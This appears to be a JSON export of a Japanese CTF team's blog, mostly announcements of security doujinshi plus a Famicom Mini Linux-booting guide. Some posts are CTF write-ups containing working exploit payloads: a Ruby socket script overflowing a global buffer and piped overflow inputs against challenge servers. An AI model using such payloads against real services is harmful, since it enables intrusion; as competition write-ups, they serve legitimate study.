公平なランサムウェアプロトコル (by yyu)  ページ数は本文34pとなっております。頒布価格は300円の予定です。\nそれでは会場でお会いしましょう。\n","date":"2017-08-08","permalink":"https://urandom.team/post/c92-announce/","tags":["Publication"],"title":"C92参加と新刊のお知らせ"},{"content":"ニコニコ超会議2017に併催の超技術書典に当選しました。スペースは 1日目 B-17 です。 C91に引き続き、“urandom vol.3”を頒布します。\n https://techbookfest.org/event/cho01/circle/5671617594130432  頒布価格は300円です。それでは会場でお会いしましょう。\n","date":"2017-04-28","permalink":"https://urandom.team/post/cho-tech/","tags":["Publication"],"title":"超技術書典参加のお知らせ"},{"content":"urandom vol.3電子版 C91の1ヶ月後に出すと告知しておいて、結局3月になってしまいましたが、urandom vol.3の電子版を公開しました。\nurandom vol.3電子版は 128円 での販売となります。内容は物理書籍版とほぼ同じです。\n販売ページはこちら（Gumroad）です。決済にはクレジットカードかPayPalが使えます。\n物理書籍版購入者の方へ 購入ページに“Offer code”という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。\n コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。 同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。  ","date":"2017-03-12","permalink":"https://urandom.team/post/c91-digital/","tags":["Publication"],"title":"urandom vol.3電子版公開のお知らせ"},{"content":"\n表紙だよ！　リンク先はサンプルのPDFだよ！（※サンプルにはカラー写真が含まれていますが、当日頒布する冊子はグレースケールです）\n数多の困難を乗り越え、来るC91で頒布する新刊「urandom vol.3」の入稿が完了しました。\n改めて告知しますと、スペースは 土曜日 東R-12b です（Webカタログ）。3日目だよ、大晦日だよ。\nページ数は本文64pと読みごたえ抜群の仕様となっております。頒布価格は300円です。\n今回の記事は以下の3本です。\n ファミコンミニとLinux - op Secure Grouping Protocol Using Mental Poker - yyu urandom出版技術部活動報告 - mayth  なお、今回既刊の頒布はありません。vol.1、vol.2は次の電子書籍をご利用ください。\n urandom vol.1 urandom vol.2  vol.3の電子書籍版はコミックマーケット91の1ヶ月後を目処に配信予定です。\nそれでは、大晦日に会場でお会いしましょう。\n","date":"2016-12-13","permalink":"https://urandom.team/post/c91-sample/","tags":["Publication"],"title":"C91 新刊のお知らせ"},{"content":"はじめに ファミコンミニ自体の権利表記画面や任天堂Webサイトで配布されているOSSソースコードからも分かるように、ファミコンミニの中で動いているのはU-bootで起動されたLinuxです。なので、ファミコンミニを適切に初期化した上で、適切にビルドしたLinuxカーネルを流しこめば、ファミコンミニ上で自前のLinuxを動かせます。U-boot(GPLv2)とLinux(GPLv2)のソースコードを読解・ビルドして自前のLinuxを起動したので、手順を書きます。\nファミコンミニで自前ビルドのLinux動いた (My Linux kernel on NES Classic) pic.twitter.com/00EZZgMx7A\n\u0026mdash; op (@6f70) 2016年11月13日  注意 この記事の内容を実践すると、製品保証が無効になったり、故障に繋がる可能性があります。内容を理解できる人が自己責任で行って下さい。\n事前準備   sunxi-fel (sunxi-tools)\n  abootimg\n  ARMのコンパイル環境\n Ubuntu 12.04 + gcc-arm-linux-gnueabi でテストしています。    ファミコンミニのシリアルコンソール\n 参考: ニンテンドークラシックミニ ファミリーコンピュータの中身の話 - えぬえす工房 参考: Nintendo NES Classic Edition - linux-sunxi.org    ファミコンミニとホストPCのUSB接続\n  手順   U-boot, 起動イメージの取得\n  シリアルコンソールで s キーを押しながらファミコンミニを起動して、U-bootのシェルに入ります。\n  シリアルコンソールで以下のコマンドを実行して、内蔵フラッシュの先頭部分を読み出します。\nsunxi_flash phy_read 58000000 0 80  読み出し先アドレス0x58000000とセクタ数0x80は、適当な使ってなさそうな所と長さなので、必然性はありません。\n  シリアルコンソールで fastboot_test コマンドを実行して、FELモードに入ります。\nfastbootと言いつつFELモードに入ります。このFELモードでは最初からDRAMが有効化されています。ただし、シリアルコンソールが壊れるようです。\n  ホストで以下のコマンドを実行して、手順1.2で読みだしたイメージをホストへ転送します。\nsunxi-fel read 0x58000000 0x1000000 0000-0080.bin    U-bootのマジック uboot でイメージ中を検索するとU-bootが見つかります。オフセット0x14にサイズが格納されているので、それを元に切り出します。切り出したファイルをu-boot.binとします。\n  起動イメージのマジック ANDROID! でイメージ中を検索すると起動イメージが見つかるので、適当に切り出します。切り出したファイルをboot.imgとします。\n    Linuxのビルド\n配布されているソースコード中の linux-9ed0e6c8612113834e9af9d16a3e90b573c488ca をビルドします。\n  drivers/video/sunxi/hdmi_ep952/EP952api.h のコメントアウトされている WARN マクロを有効にします。\n  以下のコマンドを実行してconfigします。\nexport ARCH=arm export CROSS_COMPILE=arm-linux-gnueabi- make sun8iw5p1smp_defconfig    .configに以下の変更を加えます。\nCONFIG_INITRAMFS_SOURCE=\u0026quot;\u0026quot; CONFIG_CMA=y CONFIG_FB_SUNXI=y CONFIG_CMDLINE_FORCE=n CONFIG_USB_SUPPORT=n  USBを切っているのは単にサイズ削減の為です。\n  以下のコマンドを実行してビルドします。\nmake zImage  対話的に聞かれるconfigの確認は全部そのままでもとりあえず動きました。\n    U-boot, 起動イメージの作成\n  u-boot.bin中の bootcmd=sunxi_flash phy_read 43800000 30 20;boota 43800000 を bootcmd=boota 43800000 に置換します(オフセットがずれないようにNULLパディング)。\n  以下のコマンドで起動イメージを展開します。\nabootimg -x boot.img    zImageを手順2で作成したものに差し替え、以下のコマンドで起動イメージを再作成します。\nabootimg --create myboot.img -f bootimg.cfg -k zImage -r initrd.img  このままではinitrd.imgを展開できないので、起動しても /init を実行できずにPanicします。 起動後にシェル等を操作したい場合は、カーネルパラメーターとinitrd.imgを適宜編集したり作りなおして下さい。\n    Linuxの起動\n  手順1.1, 1.3でFELモードに入ります。\n  ホストで以下のコマンドを実行すると、Linuxが起動します。\nsunxi-fel write 0x43800000 myboot.img sunxi-fel write 0x47000000 u-boot.bin sunxi-fel exe 0x47000000      おわりに ざっと手順を書き出しました。ファミコンミニは拡張性が低いのが難点ですが、計算能力はそれなりにあるので色々な事ができそうです。 Linuxカーネルはとりあえず動くものをビルドしたので、より適切なビルド方法は他にあるかと思いますし、起動手順ももっと簡素な物がありそうです。\n作業を始めた当初は fastboot_test コマンドでDRAM有効化済みのFELモードに入れる事に気付いておらず、 efex コマンドでDRAM無効なFELモードに入って、頑張って自前でDRAMを有効化して作業していました。 その辺のU-bootの紆余曲折やソースコードを解説する記事を、C91で頒布する同人誌 urandom vol.3 に書く予定です（落とさなければ）。続報は追ってこのブログに書きます。\n","date":"2016-11-14","permalink":"https://urandom.team/post/my-linux-kernel-on-nesclassic/","tags":["tech","Misc"],"title":"ファミコンミニで自前のLinuxカーネルを動かす手順"},{"content":"urandom vol.2電子版 大変長らくお待たせしました。urandom vol.2の電子版を公開しました。\nurandom vol.2電子版は 128円 での販売となります。内容は物理書籍版とほぼ同じです（どこが違うか探してみよう！　特に景品はないです）。\n販売ページはこちら（Gumroad）です。決済にはクレジットカードかPayPalが使えます。\n物理書籍版購入者の方へ 購入ページに\u0026quot;Offer code\u0026quot;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。\n コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。 同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。  urandom vol.3 続けて冬のお知らせです。無事に冬コミ（C91）に当選しました。スペースは 土曜日 東R-12b です（Webカタログはこちら）。\nこれまでだと「だいたいこういう内容になる予定ですよ」というリストくらいは出せていたのですが、今回は現時点で何も決まっておりません。 が、コンピュータセキュリティ的な本であるところからは変わりないと思います。内容が決まり次第随時告知しますので、今しばらくお待ちください。\nそれでは、今年も大晦日にお会いしましょう。\n","date":"2016-11-02","permalink":"https://urandom.team/post/c90-digital-and-c91/","tags":["Publication"],"title":"urandom vol.2電子版公開のお知らせとC91告知"},{"content":"日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。\nurandomは4問解答し600点、92位でした。\nAnalysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。\nAnalysis - Offensive 100  Category: Analysis/Offensive\nPoints: 100\nPlease enter key. Key is TMCTF flag.\nDownload the file Decrypt the downloaded file by the following command.\nopenssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip\nunzip files1.zip\n この問題は巨大なJavaScriptから正解の鍵を得るというものです。 まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。\nvar ko = \u0026quot;c33367701511b4f6020ec61ded352059\u0026quot;; var ka = \u0026quot;61636f697b57b5b7d389db0edb801fc3\u0026quot;; var kq = \u0026quot;d2172edf24129e06f3913376a12919a4\u0026quot;;  これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。\n c33367701511b4f6020ec61ded352059 → 654321 61636f697b57b5b7d389db0edb801fc3 → qwerty d2172edf24129e06f3913376a12919a4 → admin  そして次の処理でこれらの文字列を変数nlに従って並び換えているということが分かります。\nvar c = \u0026quot;\u0026quot;, d = \u0026quot;\u0026quot;, e = \u0026quot;\u0026quot;; for (var f = 0; f \u0026lt; b.length; ) { c += b[nl[++f]]; d += b[nl[++f]]; e += b[nl[++f]]; } // ......中略...... var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];  最終的にフラグはTMCTF{q6r4dy5ei2na1twm3}でした。\nAnalysis - Offensive 200  Category: Analysis - offensive\nPoints: 200\nThis challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.\nThe following code contains a bug that can be exploited to read back a flag:\n int pwned; char buffer[1024]; DWORD WINAPI CallBack(LPVOID lpParameter) { pwned = 0; ZeroMemory(buffer, 1024); SOCKET *sock = (SOCKET *)lpParameter; SOCKET _sock = *sock; send(_sock, \u0026quot;Welcome\u0026quot;, 8, 0); int ret = 0; ret = recv(_sock, buffer, 1028, 0); printf(\u0026quot;[x] RET: %d.\\n\u0026quot;, ret); printf(\u0026quot;[x] PWNED: 0x%x.\\n\u0026quot;, pwned); Sleep(1); if (((pwned \u0026gt;\u0026gt; 16)\u0026amp;0xFFFF ^ 0xc0fe) == 0x7eaf \u0026amp;\u0026amp; (((pwned \u0026amp; 0xFFFF)^0x1a1a) == 0xdae4)) { send(_sock, \u0026quot;PWNED\u0026quot;, 5, 0); ReadAndReturn(L\u0026quot;key.txt\u0026quot;, _sock); closesocket(_sock); return 0; } else { send(_sock, \u0026quot;GO AWAY\u0026quot;, 7, 0); closesocket(_sock); } return 0; }   Craft a packet that would return a valid flag. Good luck!\n bufferが1024バイトしか確保されていないにもかかわらず、11行目で ret = recv(_sock, buffer, 1028, 0); と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。\nなぜか nc が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。\nrequire 'socket' HOST = '52.197.128.90' port = (80..85).to_a.sample puts \u0026quot;connecting #{HOST}:#{port}\u0026quot; sock = TCPSocket.open('52.197.128.90', port) payload = 'a' * 1024 + \u0026quot;\\xfe\\xc0\\x51\\xbe\u0026quot; sock.read(8) sock.send(payload, 0) while r = sock.gets puts r end  そして正解をメモし忘れた 😇\nMisc 100  Category: Misc(iot and network)\nPoints: 100\nPlease analyze this pcap.\n pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。\nWiresharkでtelnetでのやりとりをテキストとして見ると、 ip xfrm stateを叩いている箇所がある。\n.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state .sudo ip xfrm state [sudo] password for reds: ynwa . src 1.1.1.11 dst 1.1.1.10 proto esp spi 0xfab21777 reqid 16389 mode tunnel replay-window 32 flag 20 auth hmac(sha1) 0x11cf27c5b3357a5fd5d26d253fffd5339a99b4d1 enc cbc(aes) 0xfa19ff5565b1666d3dd16fcfda62820da44b2b51672a85fed155521bedb243ee src 1.1.1.10 dst 1.1.1.11 proto esp spi 0xbfd6dc1c reqid 16389 mode tunnel replay-window 32 flag 20 auth hmac(sha1) 0x829b457814bd8856e51cce1d745619507ca1b257 enc cbc(aes) 0x2a340c090abec9186c841017714a233fba6144b3cb20c898db4a30f02b0a003d src 1.1.1.10 dst 1.1.1.11 proto esp spi 0xeea1503c reqid 16389 mode tunnel replay-window 32 flag 20 auth hmac(sha1) 0x951d2d93498d2e7479c28c1bcc203ace34d7fcde enc cbc(aes) 0x6ec6072dd25a6bcb7b9b3b516529acb641a1b356999f791eb971e57cc934a5eb src 1.1.1.11 dst 1.1.1.10 proto esp spi 0xd4d2074d reqid 16389 mode tunnel replay-window 32 flag 20 auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0 enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6  この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に flag.png というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。\nMisc 200  Category: Misc(iot and network)\nPoints: 200\nfind all LTE bands this phone supported.\nthe final answer will be from small to big, and use \u0026lsquo;,\u0026rsquo; to seperate without spaces.\nexample\u0026gt; if the answer is band 1 and 2 and 3, the key should be: \u0026ldquo;TMCTF{1,2,3}\u0026rdquo;\n ModemSettings.txt というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。\nこの ModemSettings.txt はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。\nLTEのバンドに関する設定は\u0026quot;6828\u0026quot;番にあるという。該当する箇所を引用する。\n6828 (0x1AAC) - OK FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。\n寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。\ni=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')  ","date":"2016-08-17","permalink":"https://urandom.team/post/tmctf2016-qual/","tags":["CTF","Write-ups","TMCTF"],"title":"Trend Micro CTF 2016 Online qualifier"},{"content":"\nCTFサークルurandomは、コミックマーケット90で新刊「urandom vol.2」を頒布します。 スペースは3日目 東4ホール ム-43bです。 記事は以下の2本で、42P 300円で頒布します。\n バイナリの調べ方 (by op) Mental Game! (by yyu)  表紙デザインはpolamjagです。 それぞれの記事から2Pずつ抜粋したサンプルを公開します。\nまた、この新刊のおまけとしてDEF CON CTF 2016 Final参戦記をコピ本で頒布予定です。 8/5-7にアメリカ ラスベガスで開催されたDEF CON CTF 2016 Finalについて、opがCTFチームbinjaのメンバーとして参加した経験を記したもので、現在執筆中です(こちらはurandomとは関係ありません)。\n","date":"2016-08-11","permalink":"https://urandom.team/post/c90-sample/","tags":["Publication"],"title":"C90新刊告知・サンプル公開"},{"content":"C90（2016年夏コミ）当選してました。スペースは 3日目 東ム-43b です。C89に引き続き、\u0026ldquo;urandom vol.2\u0026quot;を出します。内容は引き続いてないです。\nurandom vol.2はこんな感じの内容になります。\n バイナリの調べ方 (by op) Mental Game! (by yyu)  この内容で入稿を完了しています。後ほどサンプルをアップロードします。\n  （2016-07-20 修正）  諸般の事情により『.NET難読化ツール事始め』(fetastein)に代わって、『Mental Game!』(yyu)となりました 入稿完了したよ！！！！    ","date":"2016-07-20","permalink":"https://urandom.team/post/c90-announce/","tags":["Publication"],"title":"C90参加のお知らせ"},{"content":"2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催されたSunshine CTF 2016のwrite-upです。\nなお、今回は以下のメンバー編成で参加しました。\n mayth （土曜日を寝て潰す担当） op （たまに現れていくらかの助言と違法語句を残して去って行く担当）  ESTはクソ。\nForensics 50: Butterfly Effect butterfly.pngが与えられる。\nImgSteganoにファイルを読み込ませて\u0026quot;Image \u0026gt; Enhanced LSB\u0026quot;とするとフラグが現れた。\n sun{RE4DY_THE_4CID_M4GNET!}\n Exploitation 50: alligatorsim95  Don\u0026rsquo;t try to automate adding X eggs at a time\nlegends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness\n ※プログラムは与えられない。\n指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。\n-\u0026gt; u r... AN ALLIGATOR!! .. simulating alligator lifecycle .. .. simulating alligator throwing physics.. -\u0026gt; you got 1337 eggz in ur nest, how many you gonna lay alligator??  この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。\n echoとかで入力を機械的に流し込もうとしたとき (\u0026ldquo;Don\u0026rsquo;t try to automate adding X eggs at a time\u0026rdquo;) 0や数字として解釈出来ない数を与えたとき 一定時間が経過したとき  この条件下で卵の数を大きくする問題。\n色々入力を試すと、0はダメだが負数を受け付けること、また、負数であれば絶対値がいくら大きくてもよいことがわかった。 これを利用すると整数オーバーフローを引き起こすことができる。そうすると卵の数は非常に大きな値となり、フラグを得ることができる。\n-\u0026gt; u r... AN ALLIGATOR!! .. simulating alligator lifecycle .. .. simulating alligator throwing physics.. -\u0026gt; you got 1337 eggz in ur nest, how many you gonna lay alligator?? -2147483647 ~~ producing eggz ~~ .. simulating alligator lifecycle .. .. simulating alligator throwing physics.. -\u0026gt; you got -2147482310 eggz in ur nest, how many you gonna lay alligator?? -10 ~~ producing eggz ~~ .. simulating alligator lifecycle .. .. simulating alligator throwing physics.. -\u0026gt; you got -2147482320 eggz in ur nest, how many you gonna lay alligator?? -40000 ~~ producing eggz ~~ -\u0026gt; dang 2147444976 is a lotta eggs -\u0026gt; as a god among gators here is ur crown: sun{int_0verflow_i5_a_g0od_st4rt}   sun{int_0verflow_i5_a_g0od_st4rt}\n Exploitation 55: Dance  Some prefer the stanky leg, others prefer the dab, but what dance moves do you have?\n IPアドレスとポート番号が指定される。当初プログラムは与えられなかったが、後にフラグ部分を潰したバイナリが配布された。\nサーバーに接続すると以下のような文字が流れてくる。\nwelcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor! give us ur sick dance moves like so: whip,naenae,whip,whip,naenae\u0026lt;ENTER\u0026gt;  whipかnaenaeをカンマ区切りで並べて送信すると\ndo the naenae (\\) \\(:O) /||\\_ _/¯ ¯\\_  こんな感じで対応したアクションと愉快なAAが流れてくる。\n当初何をさせたいのかさっぱりわからなかったが、バイナリが配布されたのでそれを読んだ。\nその結果、こちらからの入力を受け取るバッファについて、memsetで80bytesをNULLで初期化しているにも関わらず、fgetsで最大89bytesまで読み込むようになっていることがわかった。また、0で初期化された特定の変数の値が書き換わっているときにフラグが表示されるようになっていることがわかった。\n入力の読み込みはだいたい次のようなロジックになっている。\nwhile (strlen(buf) \u0026gt; 0) { if (*buf == 'n') { buf += 7; donaenae(); } else if (*buf == 'w') { buf += 5; dowhip(); } } check_flag();  先頭しか見てないっぽいので適当に80文字の\u0026quot;n\u0026quot;を送り付けたところ、フラグが得られた。\n% ruby -e 'puts \u0026quot;n\u0026quot; * 0x50' | nc **** welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor! give us ur sick dance moves like so: whip,naenae,whip,whip,naenae\u0026lt;ENTER\u0026gt; do the naenae (\\) \\(:O) /||\\_ _/¯ ¯\\_ (snip) do the naenae (\\) \\(:O) /||\\_ _/¯ ¯\\_ girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack} cool dance! come again!   sun{d4nc3_0n_th3_s7ack}\n Misc 50: Find Floridaman  In other news\u0026hellip; Floridaman did what with an alligator?\nRemember, this has the normal flag format.\nHint: You need only look at comments from Florida-based news websites.\nHint: Gator went threw a window!\nHint: \u0026ldquo;Flori-duh\u0026rdquo;\nNOTE: Flag was posted before the 12th\n フロリダマンを探すマン。\n問題オープン当初は最初の2文だけだったのが、誰も解かないからか次々にヒントが追加されて結局ヒントが3つになった。\nヒントが3つになってから、そのヒントを元に\u0026quot;Flori-duh Alligator\u0026quot;で探してみると、次の記事が見つかった。\nWendy’s alligator-thrower is only fulfilling his Flori-duh destiny\nこの記事のReader Commentsにフラグがある。\n Summerc137 3 days ago May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s_th1s_even_real_l1fe?}\n  sun{1s_th1s_even_real_l1fe?}\n ちなみにこの事件、なんでも1mちょっとあるアリゲーターをWendy\u0026rsquo;sのドライブスルーの窓から投げ込んだのだそうな。さすがアメリカ。\n","date":"2016-03-15","permalink":"https://urandom.team/post/sunshine-ctf-2016/","tags":["CTF","Write-ups"],"title":"Sunshine CTF 2016 Write-up"},{"content":"大変長らくお待たせしました。urandom vol.1の電子書籍版をリリースしました。電子書籍版は256円での販売です。内容は物理書籍版と同一です。\n**販売ページはこちら**です（Gumroadに移動します）。決済にはクレジットカードかPayPalが使えます。\n物理書籍を購入した方へ 購入ページに\u0026quot;Offer code\u0026quot;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。\n コードを使用する場合、クレジットカード情報は不要です（正しいコードを入力すると入力欄が非表示になります）。 同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。  ","date":"2016-02-21","permalink":"https://urandom.team/post/c89-digital-book/","tags":["Publication","E-book"],"title":"urandom vol.1 電子書籍版リリース"},{"content":"先の記事で述べている通り、CTFチームurandomとしてコミックマーケット89で同人誌「urandom vol.1」を頒布します（入稿間に合った）。\nその同人誌にIDA Pythonの記事を書きました。タイトルは「Easy Recipes for IDA Python」。本全体で三章構成になっている内の一章です。 内容は、タイトルの通りIDA Pythonのための簡単レシピ的なものになっています。 IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、それらを解決する比較的簡単なIDA Pythonスクリプトの例とその解説を書いています。\nこんなん。\n\nC89 3日目(15/12/31) 東ホ-05b 500円です。 2016年2月以降に電子書籍化する予定（詳細未定）ですが、物理本の購入者には電子書籍版を無料で提供します。\n\n","date":"2015-12-29","permalink":"https://urandom.team/post/c89-idapython/","tags":["Publication","tech"],"title":"C89本にIDA Pythonの記事を書いた"},{"content":"いよいよ明日がコミケ初日ですよ！\nむっちゃドキドキしてきた…。\nコミケ戦士の皆さん、今日くらいは自慰は休んで明日に備えますよね？\nというわけでこんにちは、maythです。opが記事説明上げてたので、コミケ初日の今日に至って私もなんか書いておこうかと思います。\n今回は デコンパイラを殺すIL という記事を書いています。殺すといってもSEGVさせるとかではなく、デコンパイルを失敗させるというお話です。\n元々は『SECCON 2015 x CEDEC CHALLENGE ゲームクラッキング＆チートチャレンジ』の発表で触れた内容です（発表資料はSECCON 2015の当該記事にあります）。当日は時間が限られており、チート対策としてのデコンパイル妨害については簡単なサンプルを示すだけにとどめました。その辺りを突っ込んで書いています。\nデコンパイル妨害の指南書というよりかは、調査報告といった感じになっています。実際、本記事の流れはtkbctf2のSkill Analyzerを作るにあたって調査した分に、横浜大会で資料を作る際に再調査した分を付け加えつつ、当時の私の思考と実験をトレースしたような構成としました。\n.NET周りのエンジニアの方にチラッと読んでもらいたい感じの記事です。最近はUnityでMonoを使う機会も増えているかと思います。\n3日目（31日 木曜日）、スペースは 東ホ-05b \u0026ldquo;urandom\u0026rdquo; 、頒布価格は500円です。\nそれでは、当日スペースにてお待ちしております。\nnote: なお、記事に関するツッコミ等は適宜ブログ記事上げてもらうなり、@maytheplicまでTwitterでリプを飛ばすなりしていただければ。\n","date":"2015-12-29","permalink":"https://urandom.team/post/c89-decompiler/","tags":["Publication","tech"],"title":"[C89] デコンパイラを殺すIL"},{"content":"maythです。無事に（？）本が出来つつあります（出来たとは言っていない）。世間ではスターのウォーズのなんかの公開が間近に迫っていますが、我々に迫っているのは締め切りとクソコードです。\n\u0026ldquo;urandom vol.1\u0026quot;は記事3本でお送りします。記事の著者から内容について簡単なひとことを要求したところ1名ドロップしました。とりあえずこんな内容になります。\n Easy Recipes for IDA Python (by op)  IDA Pythonの為の簡単なレシピを解説します。   デコンパイラを殺すIL (by mayth)  .NETアプリのデコンパイルを失敗させるべく、我々調査隊はILの奥地へと飛んだ。   秘密計算入門 (by yyu)   (2015-12-25 追記)\nすっかり告知を忘れていましたが入稿を完了しています。 こんな感じの表紙です。 見事に華がないですね。 当日はスペースに何か目印っぽいものを張っておこうと思ったのですが未だ未完成です。 とりあえずスペース番号がわかりやすい何かを置いておきます、たぶん。\n改めて参加日とスペースの告知ですが、3日目（木曜日） 東ホ-05b です。 執筆者でさえ忘れていてWebカタログの地図で自分のサークルを見失いました。\n\nなお、頒布価格は500円を予定しています。消費税はありませんので、本当に500円だけ握りしめて来て頂ければと思います。\n当日誰が売り子やるのかもさっぱり定まっていませんが、スペースでお待ちしております。それでは。\n (2015-12-27 追記)\nこの同人誌は2016年2月以降に電子書籍化する予定（詳細未定）です。物理本の購入者には電子書籍版を無料で提供します。\n","date":"2015-12-16","permalink":"https://urandom.team/post/c89-pre/","tags":["Publication"],"title":"C89情報 - 予告編"},{"content":"C89当選しました。スペースは 3日目 東ホ-05b です。\n以前の告知通りの本が出ます。\n 一歩差がつくIDAコーデ (by op) デコンパイラを殺すIL (by mayth) 他、予定は未定  未だ目次が決まらないあたりに危機感を覚えつつ鋭意執筆中です。\n詳細が決まり次第こちらの記事をアップデートします。Twitterではだいたい私が告知しますが、普段のノイズが多いのでいい感じにウォッチしてください。\nちょっと気が早いですが当日皆さんにお会いできるのを楽しみにしています。それでは。\n","date":"2015-11-04","permalink":"https://urandom.team/post/c89/","tags":["Publication"],"title":"C89情報"},{"content":"\nC89に\u0026quot;urandom\u0026quot;で申し込んでいます。\n『コンピュータセキュリティ総合誌』と称したよろず本、\u0026ldquo;urandom vol.1\u0026quot;を頒布予定です。サークルカットにある通り、現時点ではこんな内容です。\n デコンパイラを殺すIL 一歩差がつくIDAコーデ  デコンパイラを殺すILはSECCON 2015 x CEDEC CHALLENGE ゲームクラッキング＆チートチャレンジの発表で触れられていた内容です。\n落ちたら落ちたでそのとき考えます。\n","date":"2015-08-29","permalink":"https://urandom.team/post/c89-appl/","tags":["Publication"],"title":"C89申し込みました"},{"content":"urandomのWebサイト作ってみました・ω・\n","date":"2015-08-28","permalink":"https://urandom.team/post/hello/","tags":null,"title":"Hello, (forgotten) World Again"}]